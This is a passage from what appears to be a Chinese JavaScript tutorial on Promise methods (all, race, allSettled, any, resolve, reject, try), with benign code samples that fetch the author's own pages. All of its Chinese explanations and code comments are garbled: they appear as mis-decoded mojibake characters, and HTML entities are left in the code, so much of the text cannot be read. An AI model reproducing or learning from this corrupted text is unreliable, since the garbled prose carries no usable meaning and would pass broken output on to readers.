resolve('hello')}) &gt;.then(result =&gt; result) &gt;.catch(e =&gt; e); &gt;//å®šä¹‰ä¸€ä¸ªå°†æŠ›å‡ºé”™è¯¯çš„promise &gt;const p2 = new Promise((resolve, reject) =&gt; { throw new Error('æŠ¥é”™äº†') }) &gt;.then(result =&gt; result) &gt;.catch(e =&gt;{ &gt;console.log('p2è‡ªå·±çš„catchæ•è·: ', e) &gt;return e; //å¼‚å¸¸è·å–ååŸæ ·è¿”å›,ä¸åšä¿®æ”¹ &gt;}); &gt;//è°ƒç”¨ Promise.all æ–¹æ³• &gt;Promise.all([p1, p2]) &gt;.then(result =&gt; console.log(' Promise.all æ–¹æ³•ä¸­çš„æˆåŠŸå›è°ƒ: ', result)) &gt;.catch(e =&gt; console.log(\" Promise.all æ–¹æ³•ä¸­çš„catch\", e)); &gt;//p2è‡ªå·±çš„catchæ•è·: Error: æŠ¥é”™äº† &gt;// Promise.all æ–¹æ³•ä¸­çš„æˆåŠŸå›è°ƒ: (2) ['hello', Error: æŠ¥é”™äº†] ä¸Šé¢ä»£ç ä¸­ï¼Œ p1ä¼šresolvedï¼Œp2é¦–å…ˆä¼šrejected ä½†æ˜¯p2æœ‰è‡ªå·±çš„catchæ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ï¼Œp2æŒ‡å‘çš„å®é™…ä¸Šæ˜¯è¿™ä¸ªå®ä¾‹ã€‚ è¯¥å®ä¾‹æ‰§è¡Œå®Œcatchæ–¹æ³•åï¼Œä¹Ÿä¼šå˜æˆresolvedï¼Œå¯¼è‡´Promise.all()æ–¹æ³•å‚æ•°é‡Œé¢çš„ä¸¤ä¸ªå®ä¾‹éƒ½ä¼šresolved å› æ­¤ä¼šè°ƒç”¨thenæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œè€Œä¸ä¼šè°ƒç”¨catchæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•° c) å¦‚æœå‚æ•°ä¸­çš„Promiseå®ä¾‹ æ²¡æœ‰ å®šä¹‰è‡ªå·±çš„catchæ–¹æ³• ? å¦‚æœp2æ²¡æœ‰è‡ªå·±çš„catchæ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨Promise.all()çš„catchæ–¹æ³•ã€‚ &gt;//å®šä¹‰ä¸€ä¸ªçŠ¶æ€å°†ä¸ºæˆåŠŸçš„çš„promise &gt;const p1 = new Promise((resolve, reject) =&gt; { resolve('hello')}) &gt;.then(result =&gt; result) &gt;//å®šä¹‰ä¸€ä¸ªå°†æŠ›å‡ºé”™è¯¯çš„promise &gt;const p2 = new Promise((resolve, reject) =&gt; { throw new Error('æŠ¥é”™äº†') }) &gt;.then(result =&gt; result) &gt;//è°ƒç”¨ Promise.all æ–¹æ³• &gt;Promise.all([p1, p2]) &gt;.then(result =&gt; console.log(' Promise.all æ–¹æ³•ä¸­çš„æˆåŠŸå›è°ƒ: ', result)) &gt;.catch(e =&gt; console.log(\" Promise.all æ–¹æ³•ä¸­çš„catch\", e)); &gt;// Promise.all æ–¹æ³•ä¸­çš„catch Error: æŠ¥é”™äº† â‘¤ Promise.race() Promise.race()æ–¹æ³•åŒæ ·æ˜¯å°†å¤šä¸ª Promise å®ä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚ &gt;const p = Promise.race([p1, p2, p3]); ä¸Šé¢ä»£ç ä¸­ï¼Œåªè¦p1ã€p2ã€p3ä¹‹ä¸­æœ‰ä¸€ä¸ªå®ä¾‹ç‡å…ˆæ”¹å˜çŠ¶æ€ï¼Œpçš„çŠ¶æ€å°±è·Ÿç€æ”¹å˜ã€‚é‚£ä¸ªç‡å…ˆæ”¹å˜çš„ Promise å®ä¾‹çš„è¿”å›å€¼ï¼Œå°±ä¼ é€’ç»™pçš„å›è°ƒå‡½æ•°ã€‚ Promise.race()æ–¹æ³•çš„å‚æ•°ä¸Promise.all()æ–¹æ³•ä¸€æ ·ï¼Œå¦‚æœä¸æ˜¯ Promise å®ä¾‹ï¼Œå°±ä¼šå…ˆè°ƒç”¨ä¸‹é¢è®²åˆ°çš„Promise.resolve()æ–¹æ³•ï¼Œå°†å‚æ•°è½¬ä¸º Promise å®ä¾‹ï¼Œå†è¿›ä¸€æ­¥å¤„ç†ã€‚ a) ä¸¾ä¸ªç®€å•çš„ğŸŒ° å¦‚p1å»¶æ—¶,å¼€å¯äº†å¼‚æ­¥,å†…éƒ¨æ­£å¸¸æ˜¯åŒæ­¥è¿›è¡Œ,æ‰€ä»¥p2&gt;p3&gt;p1,ç»“æœæ˜¯P2 &gt;let p1 = new Promise((resolve, reject) =&gt; { &gt;setTimeout(() =&gt; { &gt;resolve('OK'); &gt;}, 1000); &gt;}) &gt;let p2 = Promise.resolve('Success'); &gt;let p3 = Promise.resolve('Oh Yeah'); &gt;//è°ƒç”¨ &gt;const result = Promise.race([p1, p2, p3]); &gt;console.log(result); b) ä¸¾ä¸ªåº”ç”¨å®ğŸŒ° ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœæŒ‡å®šæ—¶é—´å†…æ²¡æœ‰è·å¾—ç»“æœï¼Œå°±å°† Promise çš„çŠ¶æ€å˜ä¸ºrejectï¼Œå¦åˆ™å˜ä¸ºresolveã€‚ &gt;const p = Promise.race([ &gt;fetch('https://gitee.com/hongjilin'), &gt;new Promise(function (resolve, reject) { &gt;setTimeout(() =&gt; reject(new Error('è¯·æ±‚è¶…æ—¶!!!!')), 5000) &gt;}) &gt;]); &gt;p &gt;.then(console.log) &gt;.catch(console.error); ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœ 5 ç§’ä¹‹å†…fetchæ–¹æ³•æ— æ³•è¿”å›ç»“æœï¼Œå˜é‡pçš„çŠ¶æ€å°±ä¼šå˜ä¸ºrejectedï¼Œä»è€Œè§¦å‘catchæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚ æ˜¯ä¸æ˜¯å¾ˆå¥½ç”¨åˆç®€å• â‘¥ Promise.allSettled() Promise.allSettled()æ–¹æ³•æ¥å—ä¸€ç»„ Promise å®ä¾‹ä½œä¸ºå‚æ•°ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚ åªæœ‰ç­‰åˆ°æ‰€æœ‰è¿™äº›å‚æ•°å®ä¾‹éƒ½è¿”å›ç»“æœï¼Œä¸ç®¡æ˜¯fulfilledè¿˜æ˜¯rejectedï¼ŒåŒ…è£…å®ä¾‹æ‰ä¼šç»“æŸã€‚ è¯¥æ–¹æ³•ç”± ES2020 å¼•å…¥ã€‚ a) ä¸¾ä¸ªç®€å•çš„ğŸŒ° &gt;const promises = [ &gt;fetch('https://gitee.com/hongjilin'), &gt;fetch('https://github.com/Hongjilin'), &gt;fetch('./hong.json'), &gt;]; &gt;loading = true; //è¯·æ±‚å‰å°† loading æ”¹ä¸ºtrue ; é¡µé¢å‡ºç°æ»šåŠ¨åŠ è½½å›¾æ ‡è’™å±‚ &gt;await Promise.allSettled(promises); &gt;loading = false; ä¸Šé¢ä»£ç å¯¹æœåŠ¡å™¨å‘å‡ºä¸‰ä¸ªè¯·æ±‚ï¼Œç­‰åˆ°ä¸‰ä¸ªè¯·æ±‚éƒ½ç»“æŸï¼Œä¸ç®¡è¯·æ±‚æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼ŒåŠ è½½çš„æ»šåŠ¨å›¾æ ‡å°±ä¼šæ¶ˆå¤±ã€‚ b) è¯¥æ–¹æ³•è¿”å›çš„æ–°çš„ Promise å®ä¾‹ï¼Œä¸€æ—¦ç»“æŸï¼ŒçŠ¶æ€æ€»æ˜¯fulfilledï¼Œä¸ä¼šå˜æˆrejected è¯¥æ–¹æ³•è¿”å›çš„æ–°çš„ Promise å®ä¾‹ï¼Œä¸€æ—¦ç»“æŸï¼ŒçŠ¶æ€æ€»æ˜¯fulfilledï¼Œä¸ä¼šå˜æˆrejectedã€‚çŠ¶æ€å˜æˆfulfilledåï¼ŒPromise çš„ç›‘å¬å‡½æ•°æ¥æ”¶åˆ°çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜å¯¹åº”ä¸€ä¸ªä¼ å…¥Promise.allSettled()çš„ Promise å®ä¾‹ã€‚ &gt;const resolved = Promise.resolve('è¿”å›æˆåŠŸçŠ¶æ€çš„promise'); &gt;const rejected = Promise.reject('è¿”å›å¤±è´¥çŠ¶æ€çš„promise'); &gt;const allSettledPromise = Promise.allSettled([resolved, rejected]); &gt;// Promise.allSettled å¾—åˆ°çš„æ–°å®ä¾‹çŠ¶æ€åªä¼šæ˜¯ `fulfilled` &gt;allSettledPromise.then(function (results) { &gt;console.log(results); //æ³¨æ„,è¿™æ˜¯ `fulfilled` çš„å›è°ƒå‡½æ•°,åªæœ‰å…¶çŠ¶æ€ä¸ºæˆåŠŸæ‰èƒ½è¿›åˆ°è¿™é‡Œ &gt;}); &gt;/* &gt;[ { \"status\": \"fulfilled\", \"value\": \"è¿”å›æˆåŠŸçŠ¶æ€çš„promise\" }, { \"status\": \"rejected\", \"reason\": \"è¿”å›å¤±è´¥çŠ¶æ€çš„promise\" } &gt;] &gt;*/ Promise.allSettled()çš„è¿”å›å€¼allSettledPromiseï¼ŒçŠ¶æ€åªå¯èƒ½å˜æˆfulfilled(æ³¨æ„,æ˜¯ allSettledPromise çš„çŠ¶æ€,è€Œä¸æ˜¯å†…éƒ¨çš„promiseå®ä¾‹) å®ƒçš„ç›‘å¬å‡½æ•°æ¥æ”¶åˆ°çš„å‚æ•°æ˜¯æ•°ç»„resultsã€‚è¯¥æ•°ç»„çš„æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹åº”çš„æ˜¯ä¼ å…¥Promise.allSettled()çš„ Promise å®ä¾‹ã€‚ æ¯ä¸ªå¯¹è±¡éƒ½æœ‰statuså±æ€§ï¼Œè¯¥å±æ€§çš„å€¼åªå¯èƒ½æ˜¯å­—ç¬¦ä¸²fulfilledæˆ–å­—ç¬¦ä¸²rejectedã€‚ fulfilledæ—¶ï¼Œå¯¹è±¡æœ‰valueå±æ€§ï¼Œrejectedæ—¶æœ‰reasonå±æ€§ï¼Œå¯¹åº”ä¸¤ç§çŠ¶æ€çš„è¿”å›å€¼ã€‚ c) ä¸¾ä¸ªè¿”å›å€¼ç”¨æ³•çš„ğŸŒ° &gt;const promises = [ fetch('./hong.json'), fetch('https://gitee.com/hongjilin') ]; &gt;const results = await Promise.allSettled(promises); &gt;// è¿‡æ»¤å‡ºæˆåŠŸçš„è¯·æ±‚ &gt;const successfulPromises = results.filter(item =&gt; item.status === 'fulfilled'); &gt;// è¿‡æ»¤å‡ºå¤±è´¥çš„è¯·æ±‚ï¼Œå¹¶å–å¾—å®ƒä»¬çš„å¤±è´¥åŸå›  &gt;const errors = results &gt;.filter(p =&gt; p.status === 'rejected') &gt;.map(p =&gt; p.reason); æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¸å…³å¿ƒå¼‚æ­¥æ“ä½œçš„ç»“æœï¼Œåªå…³å¿ƒè¿™äº›æ“ä½œæœ‰æ²¡æœ‰ç»“æŸã€‚è¿™æ—¶ï¼ŒPromise.allSettled()æ–¹æ³•å°±å¾ˆæœ‰ç”¨ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæƒ³è¦ç¡®ä¿æ‰€æœ‰æ“ä½œéƒ½ç»“æŸï¼Œå°±å¾ˆéº»çƒ¦ã€‚Promise.all()æ–¹æ³•æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ã€‚ &gt;const urls = [ 'https://gitee.com/hongjilin' ,'https://github.com/Hongjilin']; &gt;const requests = urls.map(x =&gt; fetch(x)); &gt;//ä¸¾ä¾‹ç”¨ Promise.all å°è¯•å®ç°,å¾ˆæ˜æ˜¾,éš¾ä»¥å®ç° &gt;try { &gt;await Promise.all(requests); &gt;console.log('æ‰€æœ‰è¯·æ±‚éƒ½æˆåŠŸã€‚'); &gt;} catch { &gt;console.log('è‡³å°‘ä¸€ä¸ªè¯·æ±‚å¤±è´¥ï¼Œå…¶ä»–è¯·æ±‚å¯èƒ½è¿˜æ²¡ç»“æŸã€‚'); &gt;} ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise.all()æ— æ³•ç¡®å®šæ‰€æœ‰è¯·æ±‚éƒ½ç»“æŸã€‚æƒ³è¦è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œæœ‰äº†Promise.allSettled()ï¼Œè¿™å°±å¾ˆå®¹æ˜“äº† â‘¦ Promise.any() ES2021 å¼•å…¥äº†Promise.any()æ–¹æ³•ã€‚è¯¥æ–¹æ³•æ¥å—ä¸€ç»„ Promise å®ä¾‹ä½œä¸ºå‚æ•°ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹è¿”å›ã€‚åªè¦å‚æ•°å®ä¾‹æœ‰ä¸€ä¸ªå˜æˆfulfilledçŠ¶æ€ï¼ŒåŒ…è£…å®ä¾‹å°±ä¼šå˜æˆfulfilledçŠ¶æ€ï¼›å¦‚æœæ‰€æœ‰å‚æ•°å®ä¾‹éƒ½å˜æˆrejectedçŠ¶æ€ï¼ŒåŒ…è£…å®ä¾‹å°±ä¼šå˜æˆrejectedçŠ¶æ€ã€‚ a) ä¸ Promise.race() æ–¹æ³•çš„åŒºåˆ« Promise.any()è·ŸPromise.race()æ–¹æ³•å¾ˆåƒï¼Œåªæœ‰ä¸€ç‚¹ä¸åŒï¼Œå°±æ˜¯ä¸ä¼šå› ä¸ºæŸä¸ª Promise å˜æˆrejectedçŠ¶æ€è€Œç»“æŸã€‚ &gt;const promises = [ &gt;fetch('https://gitee.com/hongjilin').then(() =&gt; 'a'), &gt;fetch('https://github.com/Hongjilin').then(() =&gt; 'b'), &gt;fetch('./hong.json').then(() =&gt; 'c'), &gt;]; &gt;try { &gt;const first = await Promise.any(promises); &gt;console.log(first); &gt;} catch (error) { &gt;console.log(error); &gt;} ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise.any()æ–¹æ³•çš„å‚æ•°æ•°ç»„åŒ…å«ä¸‰ä¸ª Promise æ“ä½œã€‚å…¶ä¸­åªè¦æœ‰ä¸€ä¸ªå˜æˆfulfilledï¼ŒPromise.any()è¿”å›çš„ Promise å¯¹è±¡å°±å˜æˆfulfilledã€‚å¦‚æœæ‰€æœ‰ä¸‰ä¸ªæ“ä½œéƒ½å˜æˆrejectedï¼Œé‚£ä¹ˆawaitå‘½ä»¤å°±ä¼šæŠ›å‡ºé”™è¯¯ã€‚ b) Promise.any() æŠ›å‡ºçš„é”™è¯¯ Promise.any()æŠ›å‡ºçš„é”™è¯¯ï¼Œä¸æ˜¯ä¸€ä¸ªä¸€èˆ¬çš„é”™è¯¯ï¼Œè€Œæ˜¯ä¸€ä¸ª AggregateError å®ä¾‹ã€‚å®ƒç›¸å½“äºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜å¯¹åº”ä¸€ä¸ªè¢«rejectedçš„æ“ä½œæ‰€æŠ›å‡ºçš„é”™è¯¯ã€‚ä¸‹é¢æ˜¯ AggregateError çš„å®ç°ç¤ºä¾‹ã€‚ &gt;new AggregateError() extends Array -&gt; AggregateError &gt;const err = new AggregateError(); &gt;err.push(new Error(\"first error\")); &gt;err.push(new Error(\"second error\")); &gt;throw err; æ•æ‰é”™è¯¯æ—¶ï¼Œå¦‚æœä¸ç”¨try...catchç»“æ„å’Œ await å‘½ä»¤ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·å†™ã€‚ &gt;Promise.any(promises).then( &gt;(first) =&gt; { &gt;// Any of the promises was fulfilled. &gt;}, &gt;(error) =&gt; { &gt;// All of the promises were rejected. &gt;} &gt;); c) å†ä¸¾ä¸ªğŸŒ° ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ &gt;const resolved = Promise.resolve('æˆåŠŸ'); &gt;const rejected = Promise.reject('å¤±è´¥äº†'); &gt;const alsoRejected = Promise.reject('å¤ªå¤±è´¥äº†'); &gt;Promise.any([resolved, rejected, alsoRejected]).then(function (result) { &gt;console.log(result); // æˆåŠŸ &gt;}); &gt;Promise.any([rejected, alsoRejected]).catch(function (results) { &gt;console.log(results); //AggregateError: All promises were rejected &gt;}); ä¸‰ä¸ªPromiseä¸­æœ‰ä¸€ä¸ªä¸ºæˆåŠŸ,åˆ™æ€»çš„ç»“æœå°±æ˜¯æˆåŠŸ,ä¸‰ä¸ªä¸­å…¨éƒ¨å¤±è´¥,æ‰ä¼šå˜æˆå¤±è´¥ â‘§ Promise.resolve() æœ‰æ—¶éœ€è¦å°†ç°æœ‰å¯¹è±¡è½¬ä¸º Promise å¯¹è±¡ï¼ŒPromise.resolve()æ–¹æ³•å°±èµ·åˆ°è¿™ä¸ªä½œç”¨ã€‚ &gt;const jsPromise = Promise.resolve($.ajax('https://gitee.com/hongjilin')); ä¸Šé¢ä»£ç å°† jQuery ç”Ÿæˆçš„deferredå¯¹è±¡ï¼Œè½¬ä¸ºä¸€ä¸ªæ–°çš„ Promise å¯¹è±¡ã€‚ Promise.resolve()ç­‰ä»·äºä¸‹é¢çš„å†™æ³•ã€‚ &gt;Promise.resolve('åŠªåŠ›å­¦ä¹ çš„æ±ª') &gt;// ç­‰ä»·äº &gt;new Promise(resolve =&gt; resolve('åŠªåŠ›å­¦ä¹ çš„æ±ª')) Promise.resolve()æ–¹æ³•çš„å‚æ•°åˆ†æˆå››ç§æƒ…å†µ a) å‚æ•°æ˜¯ä¸€ä¸ª Promise å®ä¾‹ å¦‚æœå‚æ•°æ˜¯ Promise å®ä¾‹ï¼Œé‚£ä¹ˆPromise.resolveå°†ä¸åšä»»ä½•ä¿®æ”¹ã€åŸå°ä¸åŠ¨åœ°è¿”å›è¿™ä¸ªå®ä¾‹ã€‚ b) å‚æ•°æ˜¯ä¸€ä¸ªthenableå¯¹è±¡ thenableå¯¹è±¡æŒ‡çš„æ˜¯å…·æœ‰thenæ–¹æ³•çš„å¯¹è±¡ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªå¯¹è±¡ã€‚ &gt;let thenable = { then: function(resolve, reject) { resolve('æˆåŠŸ'); } &gt;}; Promise.resolve()æ–¹æ³•ä¼šå°†è¿™ä¸ªå¯¹è±¡è½¬ä¸º Promise å¯¹è±¡ï¼Œç„¶åå°±ç«‹å³æ‰§è¡Œthenableå¯¹è±¡çš„then()æ–¹æ³•ã€‚ &gt;let thenable = { then: function(resolve, reject) { resolve('æˆåŠŸ') } &gt;}; &gt;let p1 = Promise.resolve(thenable); &gt;p1.then(function (value) { console.log(value); // 'æˆåŠŸ' &gt;}); ä¸Šé¢ä»£ç ä¸­ï¼Œthenableå¯¹è±¡çš„then()æ–¹æ³•æ‰§è¡Œåï¼Œå¯¹è±¡p1çš„çŠ¶æ€å°±å˜ä¸ºresolvedï¼Œä»è€Œç«‹å³æ‰§è¡Œæœ€åé‚£ä¸ªthen()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œè¾“å‡º **â€™æˆåŠŸâ€™**ã€‚ c) å‚æ•°ä¸æ˜¯å…·æœ‰then()æ–¹æ³•çš„å¯¹è±¡ï¼Œæˆ–æ ¹æœ¬å°±ä¸æ˜¯å¯¹è±¡ å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªåŸå§‹å€¼ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªä¸å…·æœ‰then()æ–¹æ³•çš„å¯¹è±¡ï¼Œåˆ™Promise.resolve()æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°çš„ Promise å¯¹è±¡ï¼ŒçŠ¶æ€ä¸ºresolvedã€‚ &gt;const p = Promise.resolve('åŠªåŠ›å­¦ä¹ çš„æ±ª'); &gt;p.then(function (s) { &gt;console.log(s) &gt;}); &gt;// åŠªåŠ›å­¦ä¹ çš„æ±ª ä¸Šé¢ä»£ç ç”Ÿæˆä¸€ä¸ªæ–°çš„ Promise å¯¹è±¡çš„å®ä¾‹pã€‚ ç”±äºå­—ç¬¦ä¸² åŠªåŠ›å­¦ä¹ çš„æ±ª ä¸å±äºå¼‚æ­¥æ“ä½œï¼ˆåˆ¤æ–­æ–¹æ³•æ˜¯å­—ç¬¦ä¸²å¯¹è±¡ä¸å…·æœ‰ then æ–¹æ³•ï¼‰ è¿”å› Promise å®ä¾‹çš„çŠ¶æ€ä»ä¸€ç”Ÿæˆå°±æ˜¯resolvedï¼Œæ‰€ä»¥å›è°ƒå‡½æ•°ä¼šç«‹å³æ‰§è¡Œ Promise.resolve()æ–¹æ³•çš„å‚æ•°ä¼šåŒæ—¶ä¼ ç»™å›è°ƒå‡½æ•°ä½œä¸ºå…¶å‚æ•° d) ä¸å¸¦æœ‰ä»»ä½•å‚æ•° Promise.resolve()æ–¹æ³•å…è®¸è°ƒç”¨æ—¶ä¸å¸¦å‚æ•°ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªresolvedçŠ¶æ€çš„ Promise å¯¹è±¡ã€‚ æ‰€ä»¥ï¼Œå¦‚æœå¸Œæœ›å¾—åˆ°ä¸€ä¸ª Promise å¯¹è±¡ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•å°±æ˜¯ç›´æ¥è°ƒç”¨Promise.resolve()æ–¹æ³•ã€‚ &gt;const p = Promise.resolve(); &gt;p.then(function () {}); ä¸Šé¢ä»£ç çš„å˜é‡på°±æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç«‹å³resolve()çš„ Promise å¯¹è±¡ï¼Œæ˜¯åœ¨æœ¬è½®â€œäº‹ä»¶å¾ªç¯â€ï¼ˆevent loopï¼‰çš„ç»“æŸæ—¶æ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨ä¸‹ä¸€è½®â€œäº‹ä»¶å¾ªç¯â€çš„å¼€å§‹æ—¶ â€“&gt; ä¸æ‡‚çš„åŒå­¦è¯·çœ‹ JavaScriptç¬”è®°ä¸­çš„#4äº‹ä»¶å¾ªç¯æ¨¡å‹event-loopæœºåˆ¶ ,æœ¬äººåœ¨æ­¤æœ‰è¿›è¡Œè¯¦ç»†çš„è§£æ &gt;setTimeout(function () { &gt;console.log('three'); //è¿™é‡Œæ˜¯æ–°çš„ä¸€è½®äº‹ä»¶å¾ªç¯ &gt;}, 0); &gt;Promise.resolve().then(function () { &gt;console.log('two'); //æœ¬è½®åŒæ­¥ä»£ç ç»“æŸå,æ–°ä¸€è½®äº‹ä»¶å¾ªç¯å‰,å°±æ‰§è¡Œ &gt;}); &gt;console.log('one'); &gt;// one &gt;// two &gt;// three ä¸Šé¢ä»£ç ä¸­ï¼ŒsetTimeout(fn, 0)åœ¨ä¸‹ä¸€è½®â€œäº‹ä»¶å¾ªç¯â€å¼€å§‹æ—¶æ‰§è¡Œï¼ŒPromise.resolve()åœ¨æœ¬è½®â€œäº‹ä»¶å¾ªç¯â€ç»“æŸæ—¶æ‰§è¡Œï¼Œconsole.log('one')åˆ™æ˜¯ç«‹å³æ‰§è¡Œï¼Œå› æ­¤æœ€å…ˆè¾“å‡ºã€‚ â‘¨ Promise.reject() Promise.reject(reason)æ–¹æ³•ä¹Ÿä¼šè¿”å›ä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ï¼Œè¯¥å®ä¾‹çš„çŠ¶æ€ä¸ºrejectedã€‚ &gt;const p = Promise.reject('å‡ºé”™äº†'); &gt;// ç­‰åŒäº &gt;const p = new Promise((resolve, reject) =&gt; reject('å‡ºé”™äº†')) &gt;p.then(null, function (s) { &gt;console.log(s) &gt;}); &gt;// å‡ºé”™äº† ä¸Šé¢ä»£ç ç”Ÿæˆä¸€ä¸ª Promise å¯¹è±¡çš„å®ä¾‹pï¼ŒçŠ¶æ€ä¸ºrejectedï¼Œå›è°ƒå‡½æ•°ä¼šç«‹å³æ‰§è¡Œã€‚ Promise.reject()æ–¹æ³•çš„å‚æ•°ï¼Œä¼šåŸå°ä¸åŠ¨åœ°ä½œä¸ºrejectçš„ç†ç”±ï¼Œå˜æˆåç»­æ–¹æ³•çš„å‚æ•°ã€‚ &gt;Promise.reject('å‡ºé”™äº†') &gt;.catch(e =&gt; { &gt;console.log(e === 'å‡ºé”™äº†') &gt;}) &gt;// true ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise.reject()æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢catch()æ–¹æ³•çš„å‚æ•°eå°±æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ â‘© Promise.try() å®é™…å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°ä¸€ç§æƒ…å†µï¼šä¸çŸ¥é“æˆ–è€…ä¸æƒ³åŒºåˆ†ï¼Œå‡½æ•°fæ˜¯åŒæ­¥å‡½æ•°è¿˜æ˜¯å¼‚æ­¥æ“ä½œï¼Œä½†æ˜¯æƒ³ç”¨ Promise æ¥å¤„ç†å®ƒã€‚å› ä¸ºè¿™æ ·å°±å¯ä»¥ä¸ç®¡fæ˜¯å¦åŒ…å«å¼‚æ­¥æ“ä½œï¼Œéƒ½ç”¨thenæ–¹æ³•æŒ‡å®šä¸‹ä¸€æ­¥æµç¨‹ï¼Œç”¨catchæ–¹æ³•å¤„ç†fæŠ›å‡ºçš„é”™è¯¯ã€‚ä¸€èˆ¬å°±ä¼šé‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚ &gt;Promise.resolve().then(f) ä¸Šé¢çš„å†™æ³•æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯å¦‚æœfæ˜¯åŒæ­¥å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨æœ¬è½®äº‹ä»¶å¾ªç¯çš„æœ«å°¾æ‰§è¡Œã€‚ &gt;const f = () =&gt; console.log('now'); &gt;Promise.resolve().then(f); &gt;console.log('next'); &gt;// next &gt;// now ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°fæ˜¯åŒæ­¥çš„ï¼Œä½†æ˜¯ç”¨ Promise åŒ…è£…äº†ä»¥åï¼Œå°±å˜æˆå¼‚æ­¥æ‰§è¡Œäº†ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•ï¼Œè®©åŒæ­¥å‡½æ•°åŒæ­¥æ‰§è¡Œï¼Œå¼‚æ­¥å‡½æ•°å¼‚æ­¥æ‰§è¡Œï¼Œå¹¶ä¸”è®©å®ƒä»¬å…·æœ‰ç»Ÿä¸€çš„ API å‘¢ï¼Ÿ a) å†™æ³•ä¸€ : ç”¨asyncå‡½æ•°æ¥å†™ è¯¥çŸ¥è¯†ç‚¹å¦‚æœä¸æ‡‚çš„å¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹,è¿™æ˜¯ES6çš„å¦å¤–ä¸€å—çŸ¥è¯†ç‚¹å†…å®¹ &gt;const f = () =&gt; console.log('now'); &gt;(async () =&gt; f())(); &gt;console.log('next'); &gt;// now &gt;// next ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬äºŒè¡Œæ˜¯ä¸€ä¸ªç«‹å³æ‰§è¡Œçš„åŒ¿åå‡½æ•°ï¼Œä¼šç«‹å³æ‰§è¡Œé‡Œé¢çš„asyncå‡½æ•°ï¼Œå› æ­¤å¦‚æœfæ˜¯åŒæ­¥çš„ï¼Œå°±ä¼šå¾—åˆ°åŒæ­¥çš„ç»“æœï¼›å¦‚æœfæ˜¯å¼‚æ­¥çš„ï¼Œå°±å¯ä»¥ç”¨thenæŒ‡å®šä¸‹ä¸€æ­¥ï¼Œå°±åƒä¸‹é¢çš„å†™æ³•ã€‚ &gt;(async () =&gt; f())() &gt;.then(...) éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œasync () =&gt; f()ä¼šåƒæ‰f()æŠ›å‡ºçš„é”™è¯¯ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³æ•è·é”™è¯¯ï¼Œè¦ä½¿ç”¨promise.catchæ–¹æ³•ã€‚ &gt;(async () =&gt; f())() &gt;.then(...) &gt;.catch(...) b) å†™æ³•äºŒ : ä½¿ç”¨new Promise() &gt;const f = () =&gt; console.log('now'); &gt;( () =&gt; new Promise( resolve =&gt; resolve(f()) ) &gt;)(); &gt;console.log('next'); &gt;// now &gt;// next ä¸Šé¢ä»£ç ä¹Ÿæ˜¯ä½¿ç”¨ç«‹å³æ‰§è¡Œçš„åŒ¿åå‡½æ•°ï¼Œæ‰§è¡Œnew Promise()ã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒåŒæ­¥å‡½æ•°ä¹Ÿæ˜¯åŒæ­¥æ‰§è¡Œçš„ã€‚ c) Promise.tryçš„å¼•å‡º é‰´äºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„éœ€æ±‚ï¼Œæ‰€ä»¥ç°åœ¨æœ‰ä¸€ä¸ªææ¡ˆï¼Œæä¾›Promise.tryæ–¹æ³•æ›¿ä»£ä¸Šé¢çš„å†™æ³•ã€‚ &gt;const f = () =&gt; console.log('now'); &gt;Promise.try(f); &gt;console.log('next'); &gt;// now &gt;// next 